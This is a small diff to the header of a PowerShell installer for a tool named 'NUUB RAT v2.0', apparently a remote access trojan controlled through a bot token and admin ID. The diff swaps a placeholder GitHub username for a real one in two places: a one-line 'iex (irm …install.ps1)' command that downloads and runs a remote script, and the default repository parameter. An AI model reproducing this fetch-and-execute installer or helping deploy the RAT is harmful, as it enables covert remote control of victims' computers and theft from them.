@@ -1,5 +1,5 @@
 # NUUB RAT v2.0 - Remote Installer
-# One-line install: iex (irm https://github.com/TU_USUARIO/NUUB-VERSION-2/releases/latest/download/install.ps1)
+# One-line install: iex (irm https://github.com/AnderMC66/NUUB-VERSION-2/releases/latest/download/install.ps1)
 #
 # Parameters (optional, for silent/unattended install):
 #   -Version      Release tag to download (default: "latest")
@@ -15,7 +15,7 @@
 
 param(
     [string]$Version = "latest",
-    [string]$Repo = "TU_USUARIO/NUUB-VERSION-2",
+    [string]$Repo = "AnderMC66/NUUB-VERSION-2",
     [string]$BotToken = "",
     [string]$AdminId = "",
     [string]$PcId = "PC-001",
